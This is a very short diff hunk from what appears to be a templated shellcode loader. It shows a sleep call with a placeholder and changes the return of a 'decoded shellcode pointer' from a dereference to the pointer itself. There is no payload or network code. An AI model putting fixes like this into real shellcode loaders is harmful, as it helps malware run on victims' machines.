@@ -82,7 +82,7 @@ sleep({SLEEPTIME});
 }
 
 // Return the final decoded shellcode pointer
-return *allbuffer2;
+return allbuffer2;
 
 
 
